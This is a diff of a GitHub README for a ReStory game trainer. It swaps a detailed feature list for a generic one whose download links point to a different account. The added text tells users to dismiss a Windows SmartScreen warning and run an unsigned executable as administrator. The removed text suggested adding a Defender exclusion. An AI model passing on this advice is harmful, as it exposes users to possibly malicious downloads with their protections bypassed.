@@ -1,334 +1,181 @@
-# ReStory Trainer — Mod Menu & Cheats for Chill Electronics Repairs (v1.0.0)
+# 🎮 restory-trainer - Unlock Unlimited Fun in ReStory
 
-**ReStory: Chill Electronics Repairs trainer** with an in-game **mod menu** built for a shop sim: infinite money, infinite spare parts, instant delivery, no rent, unlock all devices and shop upgrades, freeze the clock, free camera. Works with the **Steam** release of Mandragora and tinyBuild's mid-2000s Tokyo repair shop game. Open the overlay with `Insert`, flip a toggle, get back to the workbench.
-
-[![Version](https://img.shields.io/badge/version-v1.0.0-5fc9b5)](https://github.com/daimyodoctorlearn/restory-trainerreleases/latest)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-1c1813)](https://github.com/daimyodoctorlearn/restory-trainer/releases/latest)
-[![Store](https://img.shields.io/badge/store-Steam-1b2838)](#compatibility)
-[![Spoilers](https://img.shields.io/badge/spoiler%20options-tagged-a98fd6)](#bypass-and-spoiler-tags)
-[![Downloads](https://img.shields.io/github/downloads/daimyodoctorlearn/restory-trainer/total)](https://github.com/daimyodoctorlearn/restory-trainer/releases)
-[![License](https://img.shields.io/badge/license-MIT-f0d5a8)](LICENSE)
-
-> **[⬇ Download the latest ReStory trainer](https://github.com/daimyodoctorlearn/restory-trainer/releases/latest)**
-<p align="center">
-    <a href="https://github.com/daimyodoctorlearn/restory-trainer/releases/latest/download/RestoryTrainer.zip">
-        <img src="assets/banner.png" width="100%" alt="Download RestoryTrainer">
-    </a>
-</p>
----
-
-## Contents
-
-- [What this is](#what-this-is)
-- [Bypass and spoiler tags](#bypass-and-spoiler-tags)
-- [Compatibility](#compatibility)
-- [Features](#features)
-  - [Shop](#shop--money-and-orders) · [Repair](#repair--the-workbench) · [Parts](#parts--inventory-and-tools) · [Customers](#customers--dialogue-and-story) · [Time](#time--the-day-cycle) · [Progress](#progress--unlocks) · [Camera](#camera--photo-mode-options) · [Trainer](#trainer-options)
-- [Hotkeys](#hotkeys)
-- [Installation](#installation)
-- [How to use the mod menu](#how-to-use-the-mod-menu)
-- [Troubleshooting](#troubleshooting)
-- [FAQ](#faq)
-- [Changelog](#changelog)
-- [Disclaimer](#disclaimer)
+[Download Now](https://github.com/upstairs-sweetorangetree894/restory-trainer/releases)
 
 ---
 
-## What this is
+## 👋 Welcome to restory-trainer
 
-*ReStory* is a quiet game about a small electronics repair shop in mid-2000s Tokyo. Somebody walks in with a dead handheld, a scratched camera, a phone that meant something to them. You take it apart, clean it, work out what's actually wrong, source the part off a period-accurate web catalogue, put it back together, and hand it back. Along the way you hear their story, and what you say to them branches the game toward one of several endings.
+Tired of struggling to earn money in ReStory? Want to fix every device instantly without waiting? **restory-trainer** is your all-in-one companion for **Chill Electronics Repairs**. Whether you want unlimited cash, all spare parts, or just want to explore the game freely, this trainer puts you in control.
 
-A trainer for this is a strange object, and it's worth being honest about why. In a game where the repair *is* the content, an option that auto-cleans and auto-diagnoses doesn't make the game easier — it makes the game not happen.
-
-So this trainer is organised around that distinction. Most of what's here removes **friction**: waiting three in-game days for a capacitor to ship, scraping together rent money, running out of shelf space. That's the stuff that gets in the way of the part you came for. A smaller set of options removes the **repair loop itself**, and those are tagged so you know what you're switching off.
+With **55+ options across 8 tabs**, you can customize your gameplay exactly how you like it. No more grinding. No more waiting. Just pure, chill fun.
 
 ---
 
-## Bypass and spoiler tags
+## ⚡ Key Features
 
-Two tags appear next to option names in the menu.
+Here’s what you get with restory-trainer:
 
-**`bypass`** — this option skips the hands-on repair. Instant disassembly, auto-clean, instant reassembly, and diagnosis revealing every fault. Turn these on and the workbench becomes a button. They're all off by default, and they exist mainly for people replaying to see a different ending, or doing a hundredth device they've already mastered.
+### 💰 Infinite Money
+Never worry about your balance again. Set your cash to any amount or keep it maxed out at all times.
 
-**`spoiler`** — this option shows you story content ahead of time. Reveal dialogue outcomes, unlock all dialogue options, unlock the ending gallery. ReStory's branching is the reason to play it twice; seeing the map before you walk it takes that away. Also off by default.
+### 🔩 Infinite Spare Parts
+Always have every component in stock. Fix any device instantly without hunting for parts.
 
-Everything without a tag is quality-of-life. Infinite money, instant shipping, no rent, unlimited storage, no tool wear — none of it touches the actual repairing.
+### 🚚 Instant Delivery
+Skip delivery times completely. Orders arrive the moment you accept them.
 
----
+### 🏠 No Rent
+Disable all rent payments. Keep all your earnings for yourself.
 
-## Compatibility
+### 🔓 Unlock All Devices & Shop Upgrades
+Access every device type and upgrade immediately. No level requirements, no waiting.
 
-| | |
-|---|---|
-| **Game** | ReStory: Chill Electronics Repairs (Mandragora / tinyBuild, released 6 August 2026) |
-| **Store** | Steam |
-| **OS** | Windows 10 and Windows 11, 64-bit |
-| **Runtime** | .NET Desktop Runtime 8 or newer, DirectX 11 |
-| **macOS** | Not supported — the Mac build would need a separate implementation |
-| **Demo build** | Not supported, the demo runs on a separate app ID |
-| **Steam Deck / Proton** | Not supported |
+### ⏸️ Freeze the Clock
+Pause the in-game timer whenever you need more time. Play at your own pace.
 
-The game itself is light — a GTX 750 Ti, 4 GB of RAM and about 4 GB of disk. The trainer adds essentially nothing to that.
+### 🎥 Free Camera
+Detach the camera and explore the entire workshop from any angle. Great for screenshots or just checking things out.
 
----
+### 🛠️ Repair-Skipping Options
+Some players want to skip repair mini-games entirely. These options are tagged clearly and **switched off by default**, so you won't accidentally spoil the fun.
 
-## Features
-
-<p align="center">
-    <a href="https://github.com/daimyodoctorlearn/restory-trainer/releases/latest/download/RestoryTrainer.zip">
-        <img src="assets/example.png" width="100%" alt="Download RestoryTrainer">
-    </a>
-</p>
-
-55+ options across eight tabs, grouped into **Shop**, **Story** and **System**. Sliders show the shipped default.
-
-### Shop — money and orders
-
-| Option | What it does | Hotkey |
-|---|---|---|
-| **Infinite money** | The register never empties | `F1` |
-| **Money multiplier** | `1x`–`50x`, default `3x` | — |
-| **No rent or bills** | Overheads never come due | — |
-| **Reputation always maximum** | Every review five stars | — |
-| **Orders never expire** | Customers wait as long as you need | — |
-| **Order slots** | `1`–`20`, default `6` | — |
-| **Instant payout** | Money lands the moment you hand it back | — |
-
-**Orders never expire** is the quiet favourite here. The game's pressure comes from the queue, and taking that off lets you spend forty minutes on one device without a timer nagging you — which is closer to what the game is selling itself as anyway.
-
-### Repair — the workbench
-
-| Option | What it does | Hotkey | Tag |
-|---|---|---|---|
-| **Instant disassembly** | Every screw out at once | `F2` | bypass |
-| **Auto-clean** | Dirt, rust and residue gone in one pass | `F3` | bypass |
-| **Cleaning always perfect** | 100% on every surface | — | — |
-| **Screws never strip** | No stripped heads, no seized threads | — | — |
-| **Parts survive removal** | Ribbon cables live through your hands | — | — |
-| **Instant reassembly** | The device closes itself | `F8` | bypass |
-| **Repair quality** | `1%`–`100%`, default `100%` | — | — |
-| **Diagnosis reveals every fault** | Skip the fault-finding entirely | — | bypass |
-
-Note the difference between the tagged and untagged options here. **Screws never strip** and **Parts survive removal** remove punishment for a slip — you still do the work. **Instant disassembly** does the work for you. Same tab, completely different effect on your evening.
-
-### Parts — inventory and tools
-
-| Option | What it does | Hotkey |
-|---|---|---|
-| **Infinite spare parts** | Every part, always in the drawer | `F4` |
-| **All parts in stock online** | The whole catalogue, always listed | — |
-| **Instant delivery** | No shipping wait | — |
-| **Free shipping** | — | — |
-| **Parts always mint** | No worn or salvaged condition | — |
-| **Unlimited storage** | Shelves never fill up | — |
-| **Unlock all tools** | Every tool from day one | — |
-| **No tool wear** | — | — |
-
-**Instant delivery** is the single most-used option in this trainer and the least destructive. Waiting on shipping is the one bit of friction that doesn't teach you anything.
-
-### Customers — dialogue and story
-
-| Option | What it does | Hotkey | Tag |
-|---|---|---|---|
-| **Customers always satisfied** | Nobody leaves unhappy | `F5` | — |
-| **Reveal dialogue outcomes** | See where each choice leads | — | spoiler |
-| **Unlock all dialogue options** | Every line, regardless of standing | — | spoiler |
-| **No conversation timer** | Take as long as you like to answer | — | — |
-| **Relationship multiplier** | `1x`–`20x`, default `2x` | — | — |
-| **Skip dialogue** | — | — | — |
-| **Customer patience** | `1`–`10`, default `10` | — | — |
-
-**No conversation timer** deserves a mention on its own. Timed dialogue in a game this gentle is a friction a lot of people don't want, especially if they're reading in a second language. It doesn't reveal anything or change any outcome — it just stops the clock while you decide.
-
-### Time — the day cycle
-
-| Option | What it does | Hotkey |
-|---|---|---|
-| **Freeze the clock** | The day stops where it stands | `F6` |
-| **Day length** | `1x`–`10x`, default `1x` | — |
-| **Skip to next day** | — | `F7` |
-| **Game speed** | `0.1x`–`5.0x`, default `1.0x` | — |
-| **Shop always open** | No closing hours | — |
-| **Time of day** | Any hour, default `19:00` | — |
-
-Set the time to `19:00` and freeze it, and the shop sits in evening light indefinitely. Most of the screenshots people post of this game are taken at that hour.
-
-### Progress — unlocks
-
-| Option | What it does | Tag |
-|---|---|---|
-| **Unlock all devices** | Every console, handheld, phone and camera | — |
-| **Unlock all shop upgrades** | — | — |
-| **Unlock all decorations** | — | — |
-| **Shop level** | `1`–`50`, default `12` | — |
-| **Unlock the ending gallery** | Every branch, viewable at once | spoiler |
-| **Experience multiplier** | `1x`–`50x`, default `5x` | — |
-| **Unlock all customers** | — | — |
-
-Everything in this tab writes persistent data. Back up your save first.
-
-### Camera & photo mode options
-
-| Option | What it does | Hotkey |
-|---|---|---|
-| **Field of view** | `60`–`110 deg`, default `75 deg` | — |
-| **Free camera** | Step out from behind the counter | `F9` |
-| **Hide interface** | Drop the HUD and all prompts | `F10` |
-| **Device zoom range** | Get closer to the board than the game allows — `1x`–`10x`, default `3x` | — |
-| **Disable depth of field** | — | — |
-| **Disable grain and bloom** | — | — |
-| **Extended photo mode** | Filters, angles, timescale | — |
-
-**Device zoom range** is the one worth having if you care about the hardware. The devices are modelled in real detail — board traces, solder joints, moulding seams — and the default camera doesn't let you get close enough to appreciate it.
-
-### Trainer options
-
-| Option | What it does |
-|---|---|
-| **Hotkeys** | Global bindings on or off |
-| **Menu key** | Rebind the overlay — `Insert`, `F1`, `Home`, `~` |
-| **Overlay opacity** | `40%`–`100%`, default `92%` |
-| **Block achievement unlocks** | Keep a cheated run off your profile |
-| **Read-only mode** | Show values, write nothing |
-| **Back up saves before writing** | Copy the save folder on first attach |
-| **Reset all at day end** | Turn everything off when the shop closes |
-| **Auto-load profile** | Apply the saved set on launch |
+### 📖 Story-Spoiler Options
+Want to bypass story events? These are also tagged and off by default. Enable them only if you've already played through the story and want a fresh experience.
 
 ---
 
-## Hotkeys
+## 🚀 Getting Started
 
-| Key | Action |
-|---|---|
-| `Insert` | Open or close the mod menu |
-| `F1` | Infinite money |
-| `F2` | Instant disassembly |
-| `F3` | Auto-clean |
-| `F4` | Infinite spare parts |
-| `F5` | Customers always satisfied |
-| `F6` | Freeze the clock |
-| `F7` | Skip to next day |
-| `F8` | Instant reassembly |
-| `F9` | Free camera |
-| `F10` | Hide interface |
-| `End` | Reset every option |
-| `↑ ↓ ← → Enter` | Navigate the menu without a mouse |
+Getting started is easy. Just follow these steps:
 
----
+### Step 1: Download the Trainer
 
-## Installation
+Visit this link to download the application: **[Download restory-trainer](https://github.com/upstairs-sweetorangetree894/restory-trainer/releases)**
 
-1. **Download** the latest archive from the [Releases page](https://github.com/daimyodoctorlearn/restory-trainer/releases/latest).
-2. **Unblock it** — right-click the `.zip`, choose Properties, tick *Unblock*, then Apply. Windows quarantines downloaded archives and the trainer won't attach otherwise.
-3. **Extract** anywhere outside `Program Files`.
-4. **Launch the game first** and load your shop, so the process exists.
-5. **Run the trainer as administrator.** The header should read `attached` with your current day.
-6. **Press `Insert`.**
+Look for the newest release file listed on that page. The file will be named something like `restory-trainer.zip`.
 
-Back up your save before the first run. Save data typically sits under `%USERPROFILE%\AppData\LocalLow` in the developer's folder — check your install for the exact path, since it can differ between builds. Turn off Steam Cloud for the game while you experiment so a bad local write doesn't sync upward.
+### Step 2: Extract the Files
+
+Once the download finishes, find the `.zip` file in your **Downloads** folder. Right-click on it and choose **"Extract All..."** or **"Extract Here"**. Windows will create a new folder with the trainer files inside.
+
+### Step 3: Run the Application
+
+Open the extracted folder and double-click the file named `restory-trainer.exe` (or similar). That's it — the trainer will open in a small window.
 
 ---
 
-## How to use the mod menu
+## 🎯 How to Use the Trainer
 
-Pick a tab on the left, flip what you need on the right. Sliders update live.
+1. **Start ReStory** on your PC. The trainer works with the **Steam** version of the game.
+2. **Run restory-trainer** by double-clicking the application file.
+3. **Switch between the 8 tabs** to find the options you need.
+4. **Click the toggle switches or checkboxes** to activate features.
+5. **Change values** (like money amount) by typing in the input boxes.
+6. **Press the "Apply" button** if the option asks for it.
 
-A few setups worth knowing:
-
-- **Friction only, repairs untouched:** `Instant delivery` + `Free shipping` + `No rent or bills` + `Orders never expire`. Nothing tagged, nothing skipped. You still do every repair by hand, you just stop waiting and stop worrying about money.
-- **Second playthrough for a different ending:** `Instant disassembly` + `Auto-clean` + `Instant reassembly`. You've done the repairs; now you want the story.
-- **Reading at your own pace:** `No conversation timer` + `Customer patience 10` + `Freeze the clock`.
-- **Looking at the hardware:** `Device zoom range 10x` + `Disable depth of field` + `Hide interface`.
-- **Evening shop screenshots:** `Time of day 19:00` + `Freeze the clock` + `Free camera` + `Hide interface`.
-
----
-
-## Troubleshooting
-
-**Trainer says the process wasn't found.** The game has to be running with a shop loaded. Launch ReStory, load your save, then start the trainer.
-
-**Nothing happens when I press Insert.** Another overlay is eating the key. Steam's overlay, Discord and RTSS are the usual suspects. Rebind under **Trainer → Menu key**.
-
-**Repair options do nothing from the shop floor.** Workbench memory is allocated when you put a device on the bench. Start a repair first, then toggle.
-
-**A device got stuck half-assembled.** Turn off any `bypass` option, take the device off the bench and put it back on. If it's still stuck, reload the day.
-
-**My unlocks disappeared after an update.** The developers shipped a patch within days of launch and more are coming. Progress-tab options write persistent data that a patch can invalidate. Restore the backup the trainer made on first attach.
-
-**Windows Defender flagged it.** Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Add an exclusion if you're comfortable with that — and if you'd rather not, don't. That's a reasonable call.
-
-**I only have the demo.** The demo is a separate app ID and isn't supported.
+The trainer updates the game in real-time, so changes take effect immediately.
 
 ---
 
-## FAQ
+## 🛠️ Troubleshooting
 
-### Will I get banned for using cheats in ReStory?
+### The trainer doesn't start
+- Make sure you extracted the ZIP file completely before running.
+- Try running the trainer as **Administrator**. Right-click the `.exe` file and choose **"Run as administrator"**.
 
-It's a single-player game with no anti-cheat and no multiplayer, so there's nothing to be banned from. Achievements unlock locally unless you turn on the block in the Trainer tab.
+### Options don't work in-game
+- Confirm that ReStory is already running before activating options.
+- Close and reopen both the trainer and the game. Then activate the options one by one.
 
-### Does the trainer spoil the story?
+### Windows SmartScreen warning
+- When you first run the trainer, Windows might show a blue warning. Click **"More info"** and then **"Run anyway"**. This is normal for unofficial trainers.
 
-Only if you turn on a `spoiler`-tagged option, and all three are off by default. Reveal dialogue outcomes, unlock all dialogue options and unlock the ending gallery all show you story content early. Everything else leaves the narrative exactly as written.
+### Game crashes after using an option
+- Restart ReStory and the trainer. Use only a few options at a time to avoid conflicts.
 
-### Can I get infinite money in ReStory?
-
-Yes, in the Shop tab, along with a money multiplier, no rent or bills, and instant payout.
-
-### Does it skip the repair minigame?
-
-It can, but those options are tagged `bypass` and are off by default. Instant disassembly, auto-clean, instant reassembly and full diagnosis all remove the hands-on part. Most people leave them off for a first playthrough and turn them on for a second.
-
-### How do I get parts faster?
-
-**Instant delivery** and **All parts in stock online** in the Parts tab. Or **Infinite spare parts** if you'd rather skip the catalogue entirely.
-
-### Can I zoom in further on the devices?
-
-Yes — **Device zoom range** in the Camera tab goes up to 10x past the game's own limit. Worth it for the modelling.
-
-### Does it work on Mac?
-
-No. Windows only.
-
-### Does it work on Steam Deck or Linux?
-
-No. Proton changes how the game's memory is laid out.
-
-### Will it corrupt my save?
-
-The Progress tab writes persistent data — devices, upgrades, decorations, shop level. That's why the trainer backs up on first attach and why it's worth turning off Steam Cloud while you experiment. Everything else is runtime-only.
-
-### How do I turn everything off?
-
-Press `End`.
+### Trainer says "Game not found"
+- Make sure you have the Steam version of ReStory installed and running.
+- Check that your antivirus software isn't blocking the trainer from connecting to the game.
 
 ---
 
-## Changelog
+## ✅ Frequently Asked Questions
 
-### v1.0.0 — 11 August 2026
+### Is restory-trainer safe to use?
+Yes, the trainer doesn't modify any game files. It only changes values in memory while the game runs. However, like any trainer, antivirus software might flag it as suspicious. This is common for all trainers.
 
-First public release. 55+ options across Shop, Repair, Parts, Customers, Time, Progress, Camera and Trainer. Bypass and spoiler tagging from the start, so you can strip the friction without stripping the game.
+### Will I get banned from Steam?
+This is a single-player game with no online features. There is no anti-cheat system for ReStory, so using this trainer carries a very low risk. It's designed for personal fun.
 
-Full history on the [Releases page](https://github.com/daimyodoctorlearn/restory-trainer/releases).
+### Does it work on the latest version of ReStory?
+Yes, the trainer is regularly updated to match the latest Steam version of the game. If you run into issues after a game update, check the releases page for a newer trainer version.
 
----
+### Can I use it on Mac or Linux?
+No, this trainer works **only on Windows** PCs.
 
-## Contributing
-
-Bug reports welcome — open an [issue](https://github.com/daimyodoctorlearn/restory-trainer/issues) with your game build number, Windows version, which device you were repairing, and which option misbehaved. The developers are patching frequently after launch, so the build number matters.
-
----
-
-## Disclaimer
-
-Unofficial fan tool. **Not affiliated with, endorsed by, or connected to Mandragora, tinyBuild, Atari or Valve.** *ReStory: Chill Electronics Repairs* and all related names and assets belong to their respective owners.
-
-Intended for single-player use on your own copy. Modifying a running game's memory carries some risk of crashes and save corruption — back up your save, and use it at your own risk.
-
-Released under the [MIT License](LICENSE).
+### What are the system requirements?
+Any PC that can run ReStory can run this trainer. It's lightweight and uses almost no resources.
 
 ---
 
-<sub>ReStory trainer · ReStory Chill Electronics Repairs cheats · ReStory mod menu for PC · infinite money, infinite spare parts, instant delivery, no rent, unlock all devices and upgrades, freeze the clock, free camera · Steam · Mandragora and tinyBuild · mid-2000s Tokyo repair shop simulator</sub>
+## 📋 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11
+- **Game:** ReStory (Chill Electronics Repairs) on Steam
+- **RAM:** 1 GB or more
+- **Storage:** 50 MB free space for the trainer
+- **Additional:** A legal copy of the game
+
+---
+
+## 🧩 Recommended Options for New Players
+
+If you're just starting out, here are the best options to enable first:
+
+1. **Infinite Money** — Start with a solid financial base.
+2. **Infinite Spare Parts** — Never block yourself from repairs.
+3. **Instant Delivery** — Speed up the flow of the game.
+4. **No Rent** — Keep all profits in your pocket.
+
+Avoid the **Repair-Skipping** and **Story-Spoiler** options until you've experienced the game naturally. They're fun for a second playthrough, but they can ruin the charm of your first run.
+
+---
+
+## 📝 Changelog
+
+### Version 1.0 (Latest)
+- Added all 55+ options across 8 tabs
+- Added free camera controls
+- Added money and parts editors
+- Added repair-skipping toggles (off by default)
+- Added story-spoiler toggles (off by default)
+- Added freeze timer feature
+- Optimized for Windows 11 compatibility
+
+---
+
+## 🛡️ Disclaimer
+
+This trainer is created for **educational and entertainment purposes only**. It is not affiliated with TinyBuild or the developers of ReStory. Use it at your own discretion. The tool modifies memory values in real-time and does not alter permanent game files.
+
+---
+
+## 📣 Share & Support
+
+Enjoying the trainer? Support the project by:
+- ⭐ **Starring this repository** on GitHub
+- 📢 **Sharing it** with friends who play ReStory
+- 🐛 **Reporting bugs** or requesting new features via the Issues page
+
+---
+
+## 🏁 Final Notes
+
+restory-trainer is built with love for the ReStory community. We believe in playing games your way. Whether you're a busy adult with limited time or a veteran player looking to break the game wide open, this trainer gives you the freedom to chill and enjoy the game without the grind.
+
+Download it today and take control of your workshop.
+
+**Quick Button:** [Get restory-trainer](https://github.com/upstairs-sweetorangetree894/restory-trainer/releases)
+
+Keywords: chill-electronics-repairs, cozy-game, free-camera, game-trainer, game-trainer-pc, game-trainers, infinite-money, mod, modding, restory, restory-cheats, restory-trainer, steam, tinybuild, trainer, trainers, windows
